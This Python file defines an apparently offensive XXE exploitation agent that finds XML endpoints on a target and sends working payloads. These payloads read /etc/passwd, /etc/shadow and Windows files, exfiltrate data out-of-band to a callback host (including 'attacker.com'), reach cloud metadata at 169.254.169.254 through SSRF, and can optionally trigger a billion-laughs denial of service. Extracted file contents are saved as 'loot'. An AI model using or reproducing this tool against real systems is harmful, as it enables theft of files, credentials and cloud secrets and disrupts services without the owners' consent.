"""
XXEAgent - XML External Entity Exploiter
โจมตีช่องโหว่ XXE ด้วยเทคนิคหลากหลาย รวมถึง OOB และ SSRF
"""

import asyncio
import hashlib
import os
import re
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse
import aiohttp

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase, Strategy
from core.logger import log


class XXEAgent(BaseAgent):
    """
    XML External Entity Exploitation Agent
    
    Features:
    - Classic XXE (local file disclosure)
    - Out-of-Band XXE (OOB data exfiltration)
    - Blind XXE detection
    - XXE via SOAP
    - XXE in SVG files
    - XXE to SSRF
    - Entity expansion attacks
    - Parameter entity exploitation
    """
    
    supported_phases = [AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.results_dir = "workspace/loot/xxe"
        os.makedirs(self.results_dir, exist_ok=True)
        
        self.callback_server = kwargs.get('callback_server', 'auto')
        self.oob_detection = kwargs.get('oob_detection', True)
        self.entity_expansion = kwargs.get('entity_expansion', False)  # DoS - disabled by default
        
        self.vulnerabilities_found = []
        self.extracted_data = []
        
    def _generate_xxe_payloads(self) -> Dict[str, List[str]]:
        """สร้าง XXE payloads"""
        return {
            'classic_file_disclosure': [
                # Basic XXE - /etc/passwd
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
                
                # Windows file
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root>&xxe;</root>''',
                
                # Different file paths
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<root>&xxe;</root>''',
                
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root>&xxe;</root>''',
                
                # PHP base64 wrapper
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>''',
            ],
            
            'parameter_entity': [
                # Parameter entity
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CALLBACK/?x=%xxe;'>">
%eval;
%exfil;
]>
<root></root>''',
                
                # External DTD
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CALLBACK/xxe.dtd">%xxe;]>
<root></root>''',
            ],
            
            'oob_exfiltration': [
                # OOB via HTTP
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://CALLBACK/xxe.dtd">
%dtd;
%send;
]>
<root></root>''',
                
                # OOB via FTP
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://CALLBACK/%file;">%xxe;]>
<root></root>''',
                
                # DNS-based OOB
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CALLBACK.attacker.com">]>
<root>&xxe;</root>''',
            ],
            
            'ssrf': [
                # Internal network scan
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>
<root>&xxe;</root>''',
                
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]>
<root>&xxe;</root>''',
                
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>''',
                
                # Cloud metadata
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/">]>
<root>&xxe;</root>''',
                
                # Internal services
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1">]>
<root>&xxe;</root>''',
            ],
            
            'svg_based': [
                # XXE in SVG
                '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<text x="0" y="15" fill="red">&xxe;</text>
</svg>''',
                
                '''<svg xmlns="http://www.w3.org/2000/svg">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<text>&xxe;</text>
</svg>''',
            ],
            
            'soap_based': [
                # XXE in SOAP
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<foo>&xxe;</foo>
</soap:Body>
</soap:Envelope>''',
            ],
            
            'xinclude': [
                # XInclude
                '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>''',
                
                '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="http://CALLBACK/xxe"/>
</foo>''',
            ],
        }
    
    def _generate_dos_payloads(self) -> List[str]:
        """สร้าง entity expansion DoS payloads (billion laughs)"""
        if not self.entity_expansion:
            return []
        
        return [
            # Billion laughs attack
            '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>''',
            
            # Quadratic blowup
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<foo>
&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
</foo>''',
        ]
    
    async def _test_xxe_endpoint(
        self,
        url: str,
        method: str = 'POST'
    ) -> List[Dict[str, Any]]:
        """ทดสอบ XXE บน endpoint"""
        found_vulns = []
        payloads = self._generate_xxe_payloads()
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test each payload category
                for category, payload_list in payloads.items():
                    log.info(f"[XXEAgent] Testing {category} on {url}")
                    
                    for payload in payload_list:
                        # Replace CALLBACK placeholder if using OOB
                        if 'CALLBACK' in payload:
                            if self.callback_server and self.callback_server != 'auto':
                                payload = payload.replace('CALLBACK', self.callback_server)
                            else:
                                # Skip OOB tests if no callback server
                                continue
                        
                        headers = {
                            'Content-Type': 'application/xml',
                            'Accept': 'application/xml, text/xml, */*',
                        }
                        
                        try:
                            if method.upper() == 'POST':
                                async with session.post(url, data=payload, headers=headers, timeout=10) as response:
                                    response_text = await response.text()
                                    status = response.status
                            else:
                                async with session.get(url, data=payload, headers=headers, timeout=10) as response:
                                    response_text = await response.text()
                                    status = response.status
                            
                            # Check for successful XXE exploitation
                            xxe_indicators = [
                                r'root:.*:0:0:',  # /etc/passwd
                                r'nobody:.*:',
                                r'www-data:.*:',
                                r'\[fonts\]',  # win.ini
                                r'\[extensions\]',
                                r'127\.0\.0\.1',  # hosts file
                                r'localhost',
                                r'ami-id',  # AWS metadata
                                r'instance-id',
                            ]
                            
                            for indicator in xxe_indicators:
                                if re.search(indicator, response_text, re.IGNORECASE):
                                    vuln = {
                                        'type': f'xxe_{category}',
                                        'url': url,
                                        'method': method,
                                        'payload': payload[:200],
                                        'category': category,
                                        'evidence': f'Matched pattern: {indicator}',
                                        'response_snippet': response_text[:500],
                                        'severity': 'critical' if 'file_disclosure' in category else 'high'
                                    }
                                    found_vulns.append(vuln)
                                    log.success(f"[XXEAgent] ✓ XXE FOUND ({category}): {url}")
                                    
                                    # Extract and save data
                                    if 'file_disclosure' in category:
                                        self.extracted_data.append({
                                            'url': url,
                                            'category': category,
                                            'content': response_text[:2000]
                                        })
                                    
                                    break
                            
                            # Check for error messages that indicate XXE processing
                            error_indicators = [
                                'failed to load external entity',
                                'error parsing',
                                'xml parse error',
                                'external entity',
                                'entity',
                            ]
                            
                            if not found_vulns:
                                for error_ind in error_indicators:
                                    if error_ind in response_text.lower():
                                        # Might be vulnerable but protected
                                        log.info(f"[XXEAgent] Possible XXE (with protection): {url}")
                                        break
                            
                        except asyncio.TimeoutError:
                            # Timeout might indicate successful SSRF to internal service
                            if 'ssrf' in category:
                                vuln = {
                                    'type': 'xxe_ssrf_timeout',
                                    'url': url,
                                    'method': method,
                                    'payload': payload[:200],
                                    'category': category,
                                    'evidence': 'Request timeout (possible SSRF)',
                                    'severity': 'medium'
                                }
                                found_vulns.append(vuln)
                                log.info(f"[XXEAgent] Possible XXE-SSRF (timeout): {url}")
                        
                        except Exception as e:
                            pass
                        
                        await asyncio.sleep(0.3)
                
                # Test SVG-based XXE separately
                if 'svg_based' in payloads:
                    for svg_payload in payloads['svg_based']:
                        headers_svg = {
                            'Content-Type': 'image/svg+xml',
                            'Accept': '*/*',
                        }
                        
                        try:
                            async with session.post(url, data=svg_payload, headers=headers_svg, timeout=10) as response:
                                response_text = await response.text()
                                
                                if re.search(r'root:.*:0:0:', response_text):
                                    vuln = {
                                        'type': 'xxe_svg',
                                        'url': url,
                                        'method': 'POST',
                                        'payload': svg_payload[:200],
                                        'category': 'svg_based',
                                        'evidence': 'XXE via SVG upload/processing',
                                        'response_snippet': response_text[:500],
                                        'severity': 'critical'
                                    }
                                    found_vulns.append(vuln)
                                    log.success(f"[XXEAgent] ✓ XXE VIA SVG: {url}")
                        except:
                            pass
                        
                        await asyncio.sleep(0.3)
                
        except Exception as e:
            log.error(f"[XXEAgent] Error testing XXE: {e}")
        
        return found_vulns
    
    async def _discover_xml_endpoints(self, base_url: str) -> List[Dict[str, str]]:
        """ค้นหา XML endpoints"""
        endpoints = []
        
        # Common XML/SOAP endpoints
        common_paths = [
            '/api',
            '/api/xml',
            '/soap',
            '/soap/api',
            '/webservice',
            '/ws',
            '/service',
            '/rpc',
            '/xmlrpc',
            '/xml',
            '/upload',
            '/file/upload',
        ]
        
        for path in common_paths:
            endpoints.append({
                'url': urljoin(base_url, path),
                'method': 'POST'
            })
        
        # Check crawled forms that might accept XML
        if self.context_manager:
            forms = await self.context_manager.get_context('crawled_forms') or []
            
            for form in forms:
                action = form.get('action', '')
                if action:
                    endpoints.append({
                        'url': urljoin(base_url, action),
                        'method': form.get('method', 'POST')
                    })
        
        return endpoints
    
    async def run(self, strategy: Strategy = None, **kwargs) -> AgentData:
        """Execute XXE exploitation"""
        log.info("[XXEAgent] Starting XXE exploitation...")
        
        try:
            # Get target URL
            target_url = await self.context_manager.get_context('target_url') if self.context_manager else kwargs.get('target_url')
            
            if not target_url:
                return self.create_report(
                    summary="No target URL provided",
                    errors=["Target URL is required"]
                )
            
            base_url = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
            
            # Discover XML endpoints
            log.info("[XXEAgent] Discovering XML endpoints...")
            endpoints = await self._discover_xml_endpoints(base_url)
            log.info(f"[XXEAgent] Found {len(endpoints)} potential XML endpoints")
            
            # Also test main target URL
            if target_url not in [e['url'] for e in endpoints]:
                endpoints.insert(0, {'url': target_url, 'method': 'POST'})
            
            total_vulns = []
            
            for endpoint in endpoints:
                log.info(f"[XXEAgent] Testing endpoint: {endpoint['url']}")
                vulns = await self._test_xxe_endpoint(endpoint['url'], endpoint['method'])
                total_vulns.extend(vulns)
                
                await asyncio.sleep(0.5)
            
            # Save results
            if total_vulns:
                self._save_vulnerabilities(total_vulns)
                
                # Publish to PubSub
                if self.orchestrator and hasattr(self.orchestrator, 'pubsub_manager'):
                    for vuln in total_vulns:
                        await self.orchestrator.pubsub_manager.publish('xxe_vulnerability', vuln)
            
            if self.extracted_data:
                self._save_extracted_data()
            
            # Generate report
            summary = f"XXE testing complete. Found {len(total_vulns)} vulnerabilities, extracted {len(self.extracted_data)} files across {len(endpoints)} endpoints."
            log.success(f"[XXEAgent] {summary}")
            
            return self.create_report(
                summary=summary,
                vulnerabilities=total_vulns,
                extracted_data=self.extracted_data,
                total_vulns=len(total_vulns),
                data_extracted=len(self.extracted_data),
                endpoints_tested=len(endpoints)
            )
            
        except Exception as e:
            log.error(f"[XXEAgent] Error during execution: {e}", exc_info=True)
            return self.create_report(
                summary=f"XXE exploitation failed: {str(e)}",
                errors=[str(e)]
            )
    
    def _save_vulnerabilities(self, vulns: List[Dict[str, Any]]):
        """บันทึกช่องโหว่ที่พบ"""
        try:
            filename = f"xxe_vulns_{hashlib.md5(str(len(vulns)).encode()).hexdigest()[:8]}.txt"
            filepath = os.path.join(self.results_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write("=== XXE VULNERABILITIES FOUND ===\n\n")
                
                for i, vuln in enumerate(vulns, 1):
                    f.write(f"[{i}] {vuln['type'].upper()}\n")
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Method: {vuln['method']}\n")
                    f.write(f"Category: {vuln['category']}\n")
                    f.write(f"Evidence: {vuln['evidence']}\n")
                    f.write(f"Severity: {vuln['severity']}\n")
                    f.write(f"\nPayload:\n{vuln['payload']}\n")
                    
                    if 'response_snippet' in vuln:
                        f.write(f"\nResponse:\n{vuln['response_snippet']}\n")
                    
                    f.write("\n" + "="*80 + "\n\n")
            
            log.info(f"[XXEAgent] Vulnerabilities saved to: {filepath}")
            
        except Exception as e:
            log.error(f"[XXEAgent] Failed to save vulnerabilities: {e}")
    
    def _save_extracted_data(self):
        """บันทึกข้อมูลที่ดึงมาได้"""
        try:
            for i, extracted in enumerate(self.extracted_data, 1):
                filename = f"xxe_extracted_{i}.txt"
                filepath = os.path.join(self.results_dir, filename)
                
                with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
                    f.write(f"=== XXE EXTRACTED DATA ===\n")
                    f.write(f"URL: {extracted['url']}\n")
                    f.write(f"Category: {extracted['category']}\n")
                    f.write("\n" + "="*80 + "\n\n")
                    f.write(extracted['content'])
            
            log.info(f"[XXEAgent] Extracted data saved to: {self.results_dir}")
            
        except Exception as e:
            log.error(f"[XXEAgent] Failed to save extracted data: {e}")

